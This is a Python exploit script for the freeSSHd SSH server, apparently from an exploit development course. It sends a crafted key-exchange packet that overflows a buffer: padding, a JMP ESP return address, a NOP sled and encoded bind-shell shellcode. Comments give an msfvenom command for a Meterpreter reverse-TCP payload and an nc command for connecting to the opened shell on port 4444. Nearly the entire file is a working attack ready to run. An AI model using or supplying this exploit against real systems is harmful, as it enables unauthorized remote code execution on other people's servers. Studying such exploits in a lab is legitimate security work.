#!/usr/bin/python
# this is new version of python expolit development course 
# exploit DB : https://www.exploit-db.com/exploits/1787/ 
# Usage : ./freeSSHD_bindshell.py 192.168.100.10
import socket, sys,time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#fdgdfgdfgdf
sock.connect((sys.argv[1], 22))

message =  sock.recv(1000)

print message

# SSH exchange key header 
buffer = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48" \
          "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"

buffer +="A"*1055

buffer += "\x53\x93\x42\x7e" #"BBBB" JMP ESP

buffer +="\x90"*30 # No Ops instruction 

# Bind shell if you want to a meterepreter reverse_tcp shell 
# - use msfvenom to create a meterpreter shell and replace it instead of below shell code .
# msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11   -f c -b "\x00"
#
#

buffer +=("\xd9\xeb\xbd\x06\x9c\x38\x63\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x53\x31\x6a\x17\x03\x6a\x17\x83\xec\x60\xda\x96\x0c\x70\x99"
"\x59\xec\x81\xfe\xd0\x09\xb0\x3e\x86\x5a\xe3\x8e\xcc\x0e\x08"
"\x64\x80\xba\x9b\x08\x0d\xcd\x2c\xa6\x6b\xe0\xad\x9b\x48\x63"
"\x2e\xe6\x9c\x43\x0f\x29\xd1\x82\x48\x54\x18\xd6\x01\x12\x8f"
"\xc6\x26\x6e\x0c\x6d\x74\x7e\x14\x92\xcd\x81\x35\x05\x45\xd8"
"\x95\xa4\x8a\x50\x9c\xbe\xcf\x5d\x56\x35\x3b\x29\x69\x9f\x75"
"\xd2\xc6\xde\xb9\x21\x16\x27\x7d\xda\x6d\x51\x7d\x67\x76\xa6"
"\xff\xb3\xf3\x3c\xa7\x30\xa3\x98\x59\x94\x32\x6b\x55\x51\x30"
"\x33\x7a\x64\x95\x48\x86\xed\x18\x9e\x0e\xb5\x3e\x3a\x4a\x6d"
"\x5e\x1b\x36\xc0\x5f\x7b\x99\xbd\xc5\xf0\x34\xa9\x77\x5b\x51"
"\x1e\xba\x63\xa1\x08\xcd\x10\x93\x97\x65\xbe\x9f\x50\xa0\x39"
"\xdf\x4a\x14\xd5\x1e\x75\x65\xfc\xe4\x21\x35\x96\xcd\x49\xde"
"\x66\xf1\x9f\x4b\x6e\x54\x70\x6e\x93\x26\x20\x2e\x3b\xcf\x2a"
"\xa1\x64\xef\x54\x6b\x0d\x98\xa8\x94\x20\x05\x24\x72\x28\xa5"
"\x60\x2c\xc4\x07\x57\xe5\x73\x77\xbd\x5d\x13\x30\xd7\x5a\x1c"
"\xc1\xfd\xcc\x8a\x4a\x12\xc9\xab\x4c\x3f\x79\xbc\xdb\xb5\xe8"
"\x8f\x7a\xc9\x20\x67\x1e\x58\xaf\x77\x69\x41\x78\x20\x3e\xb7"
"\x71\xa4\xd2\xee\x2b\xda\x2e\x76\x13\x5e\xf5\x4b\x9a\x5f\x78"
"\xf7\xb8\x4f\x44\xf8\x84\x3b\x18\xaf\x52\x95\xde\x19\x15\x4f"
"\x89\xf6\xff\x07\x4c\x35\xc0\x51\x51\x10\xb6\xbd\xe0\xcd\x8f"
"\xc2\xcd\x99\x07\xbb\x33\x3a\xe7\x16\xf0\x4a\xa2\x3a\x51\xc3"
"\x6b\xaf\xe3\x8e\x8b\x1a\x27\xb7\x0f\xae\xd8\x4c\x0f\xdb\xdd"
"\x09\x97\x30\xac\x02\x72\x36\x03\x22\x57")

buffer +="C"*20000
buffer +="\r\n"

print len(buffer)
sock.send(buffer)

time.sleep(5)

sock.close()

# using nc to get a bind shell nc host 4444 
